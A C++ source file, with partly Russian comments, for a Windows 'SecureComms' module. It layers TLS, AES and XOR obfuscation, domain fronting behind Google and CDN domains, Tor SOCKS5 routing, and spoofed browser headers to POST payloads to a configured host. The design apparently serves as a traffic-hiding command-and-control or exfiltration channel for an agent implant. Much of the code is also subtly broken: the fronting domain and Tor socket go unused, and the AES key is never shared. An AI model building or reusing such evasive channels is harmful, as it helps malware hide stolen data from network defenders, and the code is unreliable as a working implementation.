#include "secure_comms.h"
#include "../logger/file_logger.h"
#include "../utils.h"

// Windows networking includes
#include <winsock2.h>
#include <ws2tcpip.h>

// Try to include OpenSSL, fallback to stubs if not available
#ifdef OPENSSL_AVAILABLE
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#else
#include "openssl_stub.h"
#endif

#include <random>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ws2_32.lib")

namespace SecureNetwork {

// Global instance
static std::unique_ptr<SecureComms> g_secureCommsInstance;
static std::once_flag g_instanceFlag;

// Helper macros for logging (functions declared in header)
#define LOG_INFO_STR(msg) LogInfo((msg).c_str())
#define LOG_ERROR_STR(msg) LogError((msg).c_str())
#define LOG_DEBUG_STR(msg) LogDebug((msg).c_str())
#define LOG_WARNING_STR(msg) LogWarning((msg).c_str())

// =======================================================================
// TLSConfig Implementation - TLS 1.3 Secure Connection Management
// =======================================================================

TLSConfig::TLSConfig() : sslContext(nullptr) {
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
}

TLSConfig::~TLSConfig() {
    if (sslContext) {
        SSL_CTX_free(sslContext);
    }
}

bool TLSConfig::InitializeSSLContext() {
    LogDebug("Initializing SSL context for TLS 1.3");
    
    // Create SSL context with TLS 1.3 method
    sslContext = SSL_CTX_new(TLS_client_method());
    if (!sslContext) {
        LogError("Failed to create SSL context");
        return false;
    }
    
    // Force TLS 1.3 only
    if (!SetTLS13Only()) {
        LogError("Failed to set TLS 1.3 only mode");
        return false;
    }
    
    // Set security level
    SSL_CTX_set_security_level(sslContext, 4); // High security
    
    // Disable compression to prevent CRIME attacks
    SSL_CTX_set_options(sslContext, SSL_OP_NO_COMPRESSION);
    
    // Set cipher suites for TLS 1.3
    const char* tls13_ciphers = "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256";
    if (SSL_CTX_set_ciphersuites(sslContext, tls13_ciphers) != 1) {
        LogWarning("Failed to set TLS 1.3 cipher suites");
    }
    
    // Enable certificate verification
    SSL_CTX_set_verify(sslContext, SSL_VERIFY_PEER, nullptr);
    SSL_CTX_set_verify_depth(sslContext, 5);
    
    // Load default CA certificates
    if (SSL_CTX_set_default_verify_paths(sslContext) != 1) {
        LogWarning("Failed to load default CA certificates");
    }
    
    LogInfo("SSL context initialized successfully for TLS 1.3");
    return true;
}

bool TLSConfig::SetTLS13Only() {
    if (!sslContext) return false;
    
    // Set minimum and maximum protocol versions to TLS 1.3
    SSL_CTX_set_min_proto_version(sslContext, TLS1_3_VERSION);
    SSL_CTX_set_max_proto_version(sslContext, TLS1_3_VERSION);
    
    LogDebug("TLS 1.3 only mode enabled");
    return true;
}

bool TLSConfig::AddPinnedCertificate(const std::string& certFingerprint) {
    pinnedCertificates.push_back(certFingerprint);
    LOG_DEBUG_STR("Added pinned certificate: " + certFingerprint.substr(0, 16) + "...");
    return true;
}

bool TLSConfig::VerifyServerCertificate(SSL* ssl) {
    if (pinnedCertificates.empty()) {
        return true; // No pinning configured
    }
    
    X509* cert = SSL_get_peer_certificate(ssl);
    if (!cert) {
        LogError("No server certificate provided");
        return false;
    }
    
    // Calculate certificate fingerprint
    unsigned char digest[EVP_MAX_MD_SIZE];
    unsigned int digest_len;
    
    if (X509_digest(cert, EVP_sha256(), digest, &digest_len) != 1) {
        X509_free(cert);
        LogError("Failed to calculate certificate fingerprint");
        return false;
    }
    
    // Convert to hex string
    std::stringstream ss;
    for (unsigned int i = 0; i < digest_len; i++) {
        ss << std::hex << std::setw(2) << std::setfill('0') << (int)digest[i];
    }
    std::string fingerprint = ss.str();
    
    X509_free(cert);
    
    // Check against pinned certificates
    for (const auto& pinned : pinnedCertificates) {
        if (fingerprint == pinned) {
            LogDebug("Certificate fingerprint matches pinned certificate");
            return true;
        }
    }
    
    LogError("Certificate fingerprint does not match any pinned certificates");
    return false;
}

// =======================================================================
// AESEncryption Implementation - AES-256 Encryption Layer
// =======================================================================

AESEncryption::AESEncryption() {
    GenerateRandomKey();
    GenerateRandomIV();
    LogDebug("AES-256 encryption initialized");
}

AESEncryption::~AESEncryption() {
    // Clear sensitive data
    if (!encryptionKey.empty()) {
        OPENSSL_cleanse(encryptionKey.data(), encryptionKey.size());
    }
    if (!initVector.empty()) {
        OPENSSL_cleanse(initVector.data(), initVector.size());
    }
}

void AESEncryption::GenerateRandomKey() {
    encryptionKey.resize(32); // 256 bits
    if (RAND_bytes(encryptionKey.data(), 32) != 1) {
        LogError("Failed to generate random AES key");
        // Fallback to system random
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<uint8_t> dis(0, 255);
        for (auto& byte : encryptionKey) {
            byte = dis(gen);
        }
    }
}

void AESEncryption::GenerateRandomIV() {
    initVector.resize(16); // 128 bits for AES
    if (RAND_bytes(initVector.data(), 16) != 1) {
        LogError("Failed to generate random IV");
        // Fallback to system random
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<uint8_t> dis(0, 255);
        for (auto& byte : initVector) {
            byte = dis(gen);
        }
    }
}

std::vector<uint8_t> AESEncryption::Encrypt(const std::vector<uint8_t>& plaintext) {
    if (encryptionKey.empty() || plaintext.empty()) {
        LogError("Invalid key or empty plaintext for AES encryption");
        return {};
    }
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        LogError("Failed to create AES encryption context");
        return {};
    }
    
    std::vector<uint8_t> ciphertext;
    int len;
    int ciphertext_len;
    
    // Initialize encryption
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, encryptionKey.data(), initVector.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        LogError("Failed to initialize AES encryption");
        return {};
    }
    
    // Allocate space for ciphertext
    ciphertext.resize(plaintext.size() + AES_BLOCK_SIZE);
    
    // Encrypt data
    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), static_cast<int>(plaintext.size())) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        LogError("Failed to encrypt data");
        return {};
    }
    ciphertext_len = len;
    
    // Finalize encryption
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        LogError("Failed to finalize AES encryption");
        return {};
    }
    ciphertext_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    
    ciphertext.resize(ciphertext_len);
    LOG_DEBUG_STR("AES encryption completed, size: " + std::to_string(ciphertext_len));
    return ciphertext;
}

std::vector<uint8_t> AESEncryption::Decrypt(const std::vector<uint8_t>& ciphertext) {
    if (encryptionKey.empty() || ciphertext.empty()) {
        LogError("Invalid key or empty ciphertext for AES decryption");
        return {};
    }
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        LogError("Failed to create AES decryption context");
        return {};
    }
    
    std::vector<uint8_t> plaintext;
    int len;
    int plaintext_len;
    
    // Initialize decryption
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, encryptionKey.data(), initVector.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        LogError("Failed to initialize AES decryption");
        return {};
    }
    
    // Allocate space for plaintext
    plaintext.resize(ciphertext.size() + AES_BLOCK_SIZE);
    
    // Decrypt data
    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), static_cast<int>(ciphertext.size())) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        LogError("Failed to decrypt data");
        return {};
    }
    plaintext_len = len;
    
    // Finalize decryption
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        LogError("Failed to finalize AES decryption");
        return {};
    }
    plaintext_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    
    plaintext.resize(plaintext_len);
    LOG_DEBUG_STR("AES decryption completed, size: " + std::to_string(plaintext_len));
    return plaintext;
}

bool AESEncryption::DeriveKeyFromPassword(const std::string& password, const std::vector<uint8_t>& salt) {
    if (password.empty() || salt.size() < 8) {
        LogError("Invalid password or salt for key derivation");
        return false;
    }
    
    encryptionKey.resize(32);
    
    // Use PBKDF2 for key derivation
    if (PKCS5_PBKDF2_HMAC(password.c_str(), static_cast<int>(password.length()),
                          salt.data(), static_cast<int>(salt.size()),
                          100000, // 100k iterations
                          EVP_sha256(),
                          32, encryptionKey.data()) != 1) {
        LogError("PBKDF2 key derivation failed");
        return false;
    }
    
    LogDebug("AES key derived from password using PBKDF2");
    return true;
}

// =======================================================================
// SecureComms Implementation - Main Secure Communications Class
// =======================================================================

SecureComms::SecureComms() : hSession(nullptr), hConnection(nullptr), sslConnection(nullptr) {
    // Initialize logging system first
    InitLogger();
    
    // Initialize components
    tlsConfig = std::make_unique<TLSConfig>();
    aesEncryption = std::make_unique<AESEncryption>();
    domainFronting = std::make_unique<DomainFronting>();
    torConnector = std::make_unique<TorConnector>();
    
    lastConnectionTime = std::chrono::system_clock::now();
    
    LogInfo("SecureComms initialized");
}

SecureComms::~SecureComms() {
    CleanupConnection();
    LogInfo("SecureComms destroyed");
}

bool SecureComms::Initialize(const NetworkConfig& cfg) {
    std::lock_guard<std::mutex> lock(connectionMutex);
    
    config = cfg;
    
    LOG_INFO_STR("Initializing secure communications with encryption level: " + 
                std::to_string(static_cast<int>(config.encryptionLevel)));
    
    // Initialize TLS
    if (!tlsConfig->InitializeSSLContext()) {
        LogError("Failed to initialize TLS configuration");
        return false;
    }
    
    // Configure domain fronting if enabled
    if (config.enableDomainFronting) {
        for (const auto& domain : config.domainFrontingTargets) {
            domainFronting->AddFrontingDomain(domain);
        }
        domainFronting->SetRealTarget(config.primaryHost);
        LOG_INFO_STR("Domain fronting configured with " + std::to_string(config.domainFrontingTargets.size()) + " targets");
    }
    
    // Configure Tor if enabled
    if (config.enableTorRouting) {
        if (!torConnector->SetProxy(config.torProxyAddress, config.torProxyPort)) {
            LogWarning("Failed to configure Tor proxy");
        } else {
            std::string torInfo = "Tor proxy configured at " + config.torProxyAddress + ":" + std::to_string(config.torProxyPort);
            LogInfo(torInfo.c_str());
        }
    }
    
    LogInfo("SecureComms initialization completed successfully");
    return true;
}

bool SecureComms::InitTLSConnection() {
    LogDebug("Establishing TLS 1.3 connection");
    
    // Create WinHTTP session with TLS support
    hSession = WinHttpOpen(L"SecureAgent/1.0",
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME,
                          WINHTTP_NO_PROXY_BYPASS,
                          WINHTTP_FLAG_ASYNC);
    
    if (!hSession) {
        LogError("Failed to create WinHTTP session");
        return false;
    }
    
    // Set timeouts
    WinHttpSetTimeouts(hSession, 
                      config.connectionTimeout,  // Resolve timeout
                      config.connectionTimeout,  // Connect timeout  
                      config.readTimeout,        // Send timeout
                      config.readTimeout);       // Receive timeout
    
    // Enable TLS 1.3
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof(protocols));
    
    LogInfo("TLS 1.3 connection initialized successfully");
    return true;
}

std::vector<uint8_t> SecureComms::EncryptPayload(const std::string& data) {
    if (data.empty()) {
        LogWarning("Empty data provided for encryption");
        return {};
    }
    
    LOG_DEBUG_STR("Encrypting payload of size: " + std::to_string(data.size()));
    
    std::vector<uint8_t> result(data.begin(), data.end());
    
    // Apply encryption based on configured level
    switch (config.encryptionLevel) {
        case EncryptionLevel::TLS_ONLY:
            // Data will be encrypted by TLS layer only
            LogDebug("Using TLS-only encryption");
            break;
            
        case EncryptionLevel::TLS_PLUS_AES:
            // Apply AES-256 encryption on top of TLS
            result = aesEncryption->Encrypt(result);
            if (result.empty()) {
                LogError("AES encryption failed");
                return {};
            }
            LogDebug("Applied TLS + AES-256 encryption");
            break;
            
        case EncryptionLevel::TRIPLE_ENCRYPTION:
            // Apply AES-256 + custom XOR obfuscation
            result = aesEncryption->Encrypt(result);
            if (result.empty()) {
                LogError("AES encryption failed");
                return {};
            }
            
            // Apply additional XOR obfuscation
            uint8_t xor_key = static_cast<uint8_t>(std::chrono::high_resolution_clock::now().time_since_epoch().count() & 0xFF);
            for (auto& byte : result) {
                byte ^= xor_key;
            }
            
            // Prepend XOR key to data
            result.insert(result.begin(), xor_key);
            LogDebug("Applied triple encryption (TLS + AES + XOR)");
            break;
    }
    
    LOG_DEBUG_STR("Payload encryption completed, final size: " + std::to_string(result.size()));
    return result;
}

CommResult SecureComms::SendEncryptedData(const std::vector<uint8_t>& payload) {
    CommResult result;
    
    if (payload.empty()) {
        result.errorMessage = "Empty payload provided";
        LOG_ERROR_STR(result.errorMessage);
        return result;
    }
    
    LOG_INFO_STR("Sending encrypted data, payload size: " + std::to_string(payload.size()));
    
    auto startTime = std::chrono::high_resolution_clock::now();
    
    // Try different connection methods in order of preference
    std::vector<ConnectionType> connectionOrder = {
        ConnectionType::DIRECT_HTTPS,
        ConnectionType::DOMAIN_FRONTING,
        ConnectionType::TOR_PROXY,
        ConnectionType::FALLBACK
    };
    
    for (const auto& connType : connectionOrder) {
        // Skip disabled connection types
        if (connType == ConnectionType::DOMAIN_FRONTING && !config.enableDomainFronting) continue;
        if (connType == ConnectionType::TOR_PROXY && !config.enableTorRouting) continue;
        
        LOG_DEBUG_STR("Attempting connection type: " + std::to_string(static_cast<int>(connType)));
        
        if (EstablishConnection(connType)) {
            if (SendHTTPRequest("POST", "/api/data", payload, result)) {
                result.success = true;
                result.usedConnection = connType;
                auto endTime = std::chrono::high_resolution_clock::now();
                result.responseTime = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime);
                
                LOG_INFO_STR("Data sent successfully via " + std::to_string(static_cast<int>(connType)) + 
                           " in " + std::to_string(result.responseTime.count()) + "ms");
                return result;
            }
        }
        
        LOG_WARNING_STR("Connection type " + std::to_string(static_cast<int>(connType)) + " failed, trying next");
    }
    
    result.errorMessage = "All connection methods failed";
    LOG_ERROR_STR(result.errorMessage);
    return result;
}

// =======================================================================
// DomainFronting Implementation - CDN Domain Fronting System
// =======================================================================

DomainFronting::DomainFronting() {
    // Инициализация с популярными CDN провайдерами
    AddCDNProvider("cloudflare.com");
    AddCDNProvider("amazonaws.com");
    AddCDNProvider("azure.microsoft.com");
    AddCDNProvider("fastly.com");
    AddCDNProvider("cloudfront.net");
    
    // Популярные домены для маскировки
    AddFrontingDomain("ajax.googleapis.com");
    AddFrontingDomain("fonts.googleapis.com");
    AddFrontingDomain("cdnjs.cloudflare.com");
    AddFrontingDomain("unpkg.com");
    AddFrontingDomain("jsdelivr.net");
    
    std::string initMsg = "Domain fronting initialized with " + std::to_string(frontingDomains.size()) + " domains";
    LogDebug(initMsg.c_str());
}

void DomainFronting::AddCDNProvider(const std::string& provider) {
    cdnProviders.push_back(provider);
    LOG_DEBUG_STR("Added CDN provider: " + provider);
}

void DomainFronting::AddFrontingDomain(const std::string& domain) {
    frontingDomains.push_back(domain);
    LOG_DEBUG_STR("Added fronting domain: " + domain);
}

void DomainFronting::SetRealTarget(const std::string& target) {
    realTargetHost = target;
    LOG_DEBUG_STR("Set real target host: " + target);
}

std::string DomainFronting::GetFrontingDomain() {
    if (frontingDomains.empty()) {
        LogWarning("No fronting domains available");
        return "";
    }
    
    // Выбираем случайный домен для маскировки
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, frontingDomains.size() - 1);
    
    std::string selectedDomain = frontingDomains[dis(gen)];
    LOG_DEBUG_STR("Selected fronting domain: " + selectedDomain);
    return selectedDomain;
}

std::map<std::string, std::string> DomainFronting::BuildFrontingHeaders(const std::string& realHost) {
    std::map<std::string, std::string> headers;
    
    // Основные заголовки для domain fronting
    headers["Host"] = realHost;  // Реальный хост в заголовке Host
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8";
    headers["Accept-Language"] = "en-US,en;q=0.5";
    headers["Accept-Encoding"] = "gzip, deflate, br";
    headers["DNT"] = "1";
    headers["Connection"] = "keep-alive";
    headers["Upgrade-Insecure-Requests"] = "1";
    headers["Sec-Fetch-Dest"] = "document";
    headers["Sec-Fetch-Mode"] = "navigate";
    headers["Sec-Fetch-Site"] = "none";
    headers["Sec-Fetch-User"] = "?1";
    headers["Cache-Control"] = "max-age=0";
    
    // Добавляем заголовки для имитации легитимного трафика
    headers["X-Forwarded-For"] = "127.0.0.1";
    headers["X-Real-IP"] = "127.0.0.1";
    
    LOG_DEBUG_STR("Built fronting headers for host: " + realHost);
    return headers;
}

bool DomainFronting::IsProviderAvailable(const std::string& provider) {
    // Простая проверка доступности провайдера через DNS lookup
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    struct addrinfo hints, *result;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    
    int status = getaddrinfo(provider.c_str(), "443", &hints, &result);
    
    if (result) {
        freeaddrinfo(result);
    }
    WSACleanup();
    
    bool available = (status == 0);
    LOG_DEBUG_STR("Provider " + provider + " availability: " + (available ? "yes" : "no"));
    return available;
}

// =======================================================================
// TorConnector Implementation - Tor SOCKS5 Proxy Integration
// =======================================================================

TorConnector::TorConnector() : proxyHost("127.0.0.1"), proxyPort(9050), isConnected(false), proxySocket(INVALID_SOCKET) {
    // Инициализация Winsock
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    LogDebug("Tor connector initialized");
}

TorConnector::~TorConnector() {
    Disconnect();
    WSACleanup();
}

bool TorConnector::SetProxy(const std::string& host, int port) {
    proxyHost = host;
    proxyPort = port;
    std::string proxyInfo = "Tor proxy set to " + host + ":" + std::to_string(port);
    LogInfo(proxyInfo.c_str());
    return true;
}

bool TorConnector::TestTorConnection() {
    LogDebug("Testing Tor connection...");
    
    // Создаем тестовое SOCKS5 соединение
    SOCKET testSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (testSocket == INVALID_SOCKET) {
        LogError("Failed to create test socket");
        return false;
    }
    
    // Устанавливаем таймаут
    int timeout = 5000; // 5 секунд
    setsockopt(testSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(testSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    struct sockaddr_in proxyAddr;
    proxyAddr.sin_family = AF_INET;
    proxyAddr.sin_port = htons(proxyPort);
    inet_pton(AF_INET, proxyHost.c_str(), &proxyAddr.sin_addr);
    
    // Подключаемся к Tor прокси
    if (connect(testSocket, (struct sockaddr*)&proxyAddr, sizeof(proxyAddr)) == SOCKET_ERROR) {
        std::string errorMsg = "Cannot connect to Tor proxy at " + proxyHost + ":" + std::to_string(proxyPort);
        LogWarning(errorMsg.c_str());
        closesocket(testSocket);
        return false;
    }
    
    // Отправляем SOCKS5 greeting
    char greeting[] = {0x05, 0x01, 0x00}; // SOCKS5, 1 method, no auth
    if (send(testSocket, greeting, 3, 0) != 3) {
        LogError("Failed to send SOCKS5 greeting");
        closesocket(testSocket);
        return false;
    }
    
    // Читаем ответ
    char response[2];
    if (recv(testSocket, response, 2, 0) != 2) {
        LogError("Failed to receive SOCKS5 response");
        closesocket(testSocket);
        return false;
    }
    
    closesocket(testSocket);
    
    // Проверяем корректность ответа
    if (response[0] == 0x05 && response[1] == 0x00) {
        LogInfo("Tor connection test successful");
        return true;
    } else {
        LogWarning("Invalid SOCKS5 response from Tor proxy");
        return false;
    }
}

bool TorConnector::EstablishSOCKS5Connection() {
    if (proxySocket != INVALID_SOCKET) {
        closesocket(proxySocket);
    }
    
    proxySocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (proxySocket == INVALID_SOCKET) {
        LogError("Failed to create SOCKS5 socket");
        return false;
    }
    
    struct sockaddr_in proxyAddr;
    proxyAddr.sin_family = AF_INET;
    proxyAddr.sin_port = htons(proxyPort);
    inet_pton(AF_INET, proxyHost.c_str(), &proxyAddr.sin_addr);
    
    if (connect(proxySocket, (struct sockaddr*)&proxyAddr, sizeof(proxyAddr)) == SOCKET_ERROR) {
        LogError("Failed to connect to SOCKS5 proxy");
        closesocket(proxySocket);
        proxySocket = INVALID_SOCKET;
        return false;
    }
    
    LogDebug("SOCKS5 connection established");
    return true;
}

bool TorConnector::AuthenticateSOCKS5() {
    // SOCKS5 authentication
    char greeting[] = {0x05, 0x01, 0x00}; // SOCKS5, 1 method, no auth
    if (send(proxySocket, greeting, 3, 0) != 3) {
        LogError("Failed to send SOCKS5 greeting");
        return false;
    }
    
    char response[2];
    if (recv(proxySocket, response, 2, 0) != 2) {
        LogError("Failed to receive SOCKS5 greeting response");
        return false;
    }
    
    if (response[0] != 0x05 || response[1] != 0x00) {
        LogError("SOCKS5 authentication failed");
        return false;
    }
    
    LogDebug("SOCKS5 authentication successful");
    return true;
}

bool TorConnector::ConnectThroughSOCKS5(const std::string& targetHost, int targetPort) {
    // Формируем SOCKS5 connect request
    std::vector<char> request;
    request.push_back(0x05); // SOCKS version
    request.push_back(0x01); // Connect command
    request.push_back(0x00); // Reserved
    request.push_back(0x03); // Domain name address type
    
    // Добавляем длину доменного имени
    request.push_back((char)targetHost.length());
    
    // Добавляем доменное имя
    for (char c : targetHost) {
        request.push_back(c);
    }
    
    // Добавляем порт (big-endian)
    request.push_back((char)(targetPort >> 8));
    request.push_back((char)(targetPort & 0xFF));
    
    // Отправляем запрос
    if (send(proxySocket, request.data(), request.size(), 0) != (int)request.size()) {
        LogError("Failed to send SOCKS5 connect request");
        return false;
    }
    
    // Читаем ответ
    char response[10]; // Максимальный размер ответа
    if (recv(proxySocket, response, 10, 0) < 4) {
        LogError("Failed to receive SOCKS5 connect response");
        return false;
    }
    
    if (response[0] != 0x05 || response[1] != 0x00) {
        std::string errorMsg = "SOCKS5 connect failed, status: " + std::to_string((unsigned char)response[1]);
        LogError(errorMsg.c_str());
        return false;
    }
    
    std::string successMsg = "SOCKS5 connection to " + targetHost + ":" + std::to_string(targetPort) + " established";
    LogInfo(successMsg.c_str());
    return true;
}

bool TorConnector::ConnectViaProxy(const std::string& targetHost, int targetPort) {
    if (!EstablishSOCKS5Connection()) {
        return false;
    }
    
    if (!AuthenticateSOCKS5()) {
        Disconnect();
        return false;
    }
    
    if (!ConnectThroughSOCKS5(targetHost, targetPort)) {
        Disconnect();
        return false;
    }
    
    isConnected = true;
    std::string successMsg = "Successfully connected via Tor proxy to " + targetHost + ":" + std::to_string(targetPort);
    LogInfo(successMsg.c_str());
    return true;
}

void TorConnector::Disconnect() {
    if (proxySocket != INVALID_SOCKET) {
        closesocket(proxySocket);
        proxySocket = INVALID_SOCKET;
    }
    isConnected = false;
    LogDebug("Tor connection disconnected");
}

// =======================================================================
// SecureComms Additional Methods Implementation
// =======================================================================

bool SecureComms::EstablishConnection(ConnectionType type) {
    std::lock_guard<std::mutex> lock(connectionMutex);
    
    LOG_DEBUG_STR("Establishing connection type: " + std::to_string(static_cast<int>(type)));
    
    // Очищаем предыдущее соединение
    CleanupConnection();
    
    switch (type) {
        case ConnectionType::DIRECT_HTTPS:
            return InitTLSConnection();
            
        case ConnectionType::DOMAIN_FRONTING:
            if (!config.enableDomainFronting) {
                LogWarning("Domain fronting not enabled");
                return false;
            }
            
            // Используем domain fronting
            if (InitTLSConnection()) {
                std::string frontingDomain = domainFronting->GetFrontingDomain();
                if (!frontingDomain.empty()) {
                    LOG_INFO_STR("Using domain fronting via: " + frontingDomain);
                    return true;
                }
            }
            return false;
            
        case ConnectionType::TOR_PROXY:
            if (!config.enableTorRouting) {
                LogWarning("Tor routing not enabled");
                return false;
            }
            
            // Тестируем Tor соединение
            if (!torConnector->TestTorConnection()) {
                LogError("Tor connection test failed");
                return false;
            }
            
            // Подключаемся через Tor к целевому хосту
            if (torConnector->ConnectViaProxy(config.primaryHost, 443)) {
                LogInfo("Connected via Tor proxy");
                return InitTLSConnection();
            }
            return false;
            
        case ConnectionType::FALLBACK:
            // Пробуем backup host
            if (!config.backupHost.empty()) {
                LOG_INFO_STR("Trying fallback connection to: " + config.backupHost);
                std::string originalHost = config.primaryHost;
                config.primaryHost = config.backupHost;
                bool success = InitTLSConnection();
                config.primaryHost = originalHost;
                return success;
            }
            return false;
            
        default:
            LogError("Unknown connection type");
            return false;
    }
}

bool SecureComms::SendHTTPRequest(const std::string& method, const std::string& path, 
                                 const std::vector<uint8_t>& data, CommResult& result) {
    if (!hSession) {
        result.errorMessage = "No active session";
        return false;
    }
    
    std::wstring wideHost = Utils::StringToWString(config.primaryHost);
    hConnection = WinHttpConnect(hSession, wideHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    
    if (!hConnection) {
        result.errorMessage = "Failed to create connection";
        return false;
    }
    
    // Создаем запрос
    std::wstring widePath = Utils::StringToWString(path);
    std::wstring wideMethod = Utils::StringToWString(method);
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, wideMethod.c_str(), widePath.c_str(),
                                           NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                           WINHTTP_FLAG_SECURE);
    
    if (!hRequest) {
        result.errorMessage = "Failed to create request";
        return false;
    }
    
    // Устанавливаем заголовки
    std::string headers = "Content-Type: application/octet-stream\r\n";
    headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124\r\n";
    
    std::wstring wideHeaders = Utils::StringToWString(headers);
    WinHttpAddRequestHeaders(hRequest, wideHeaders.c_str(), -1, WINHTTP_ADDREQ_FLAG_ADD);
    
    // Отправляем запрос
    BOOL requestSent = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                         (LPVOID)data.data(), (DWORD)data.size(),
                                         (DWORD)data.size(), 0);
    
    if (!requestSent) {
        WinHttpCloseHandle(hRequest);
        result.errorMessage = "Failed to send request";
        return false;
    }
    
    // Получаем ответ
    BOOL responseReceived = WinHttpReceiveResponse(hRequest, NULL);
    if (!responseReceived) {
        WinHttpCloseHandle(hRequest);
        result.errorMessage = "Failed to receive response";
        return false;
    }
    
    // Читаем статус код
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                       WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX);
    
    result.httpStatus = statusCode;
    
    // Читаем данные ответа
    DWORD bytesAvailable = 0;
    while (WinHttpQueryDataAvailable(hRequest, &bytesAvailable) && bytesAvailable > 0) {
        std::vector<char> buffer(bytesAvailable);
        DWORD bytesRead = 0;
        
        if (WinHttpReadData(hRequest, buffer.data(), bytesAvailable, &bytesRead)) {
            result.responseData.insert(result.responseData.end(), buffer.begin(), buffer.begin() + bytesRead);
        } else {
            break;
        }
    }
    
    WinHttpCloseHandle(hRequest);
    
    LOG_INFO_STR("HTTP " + method + " request completed, status: " + std::to_string(statusCode));
    return statusCode >= 200 && statusCode < 300;
}

CommResult SecureComms::SendEncryptedData(const std::string& data) {
    std::vector<uint8_t> encrypted = EncryptPayload(data);
    return SendEncryptedData(encrypted);
}

CommResult SecureComms::GET(const std::string& path) {
    CommResult result;
    EstablishConnection(ConnectionType::DIRECT_HTTPS);
    std::vector<uint8_t> emptyData;
    SendHTTPRequest("GET", path, emptyData, result);
    return result;
}

CommResult SecureComms::POST(const std::string& path, const std::vector<uint8_t>& data) {
    CommResult result;
    EstablishConnection(ConnectionType::DIRECT_HTTPS);
    SendHTTPRequest("POST", path, data, result);
    return result;
}

CommResult SecureComms::POST(const std::string& path, const std::string& data) {
    std::vector<uint8_t> dataBytes(data.begin(), data.end());
    return POST(path, dataBytes);
}

void SecureComms::UseDomainFronting() {
    config.enableDomainFronting = true;
    LogInfo("Domain fronting enabled");
}

void SecureComms::DisableDomainFronting() {
    config.enableDomainFronting = false;
    LogInfo("Domain fronting disabled");
}

bool SecureComms::ConnectViaTor() {
    config.enableTorRouting = true;
    LogInfo("Tor routing enabled");
    return torConnector->TestTorConnection();
}

bool SecureComms::DisconnectTor() {
    config.enableTorRouting = false;
    torConnector->Disconnect();
    LogInfo("Tor routing disabled");
    return true;
}

void SecureComms::CleanupConnection() {
    if (hConnection) {
        WinHttpCloseHandle(hConnection);
        hConnection = nullptr;
    }
    
    if (hSession) {
        WinHttpCloseHandle(hSession);
        hSession = nullptr;
    }
    
    if (sslConnection) {
        SSL_shutdown(sslConnection);
        SSL_free(sslConnection);
        sslConnection = nullptr;
    }
    
    // Отключаем Tor если активен
    if (torConnector && torConnector->IsConnected()) {
        torConnector->Disconnect();
    }
}

// =======================================================================
// Additional SecureComms Methods Implementation - Заглушки и дополнительные функции
// =======================================================================

void SecureComms::UpdateConfiguration(const NetworkConfig& newConfig) {
    std::lock_guard<std::mutex> lock(connectionMutex);
    config = newConfig;
    LogInfo("Configuration updated");
}

NetworkConfig SecureComms::GetConfiguration() const {
    return config;
}

void SecureComms::SetEncryptionLevel(EncryptionLevel level) {
    config.encryptionLevel = level;
    std::string levelStr = "Encryption level set to: " + std::to_string(static_cast<int>(level));
    LogInfo(levelStr.c_str());
}

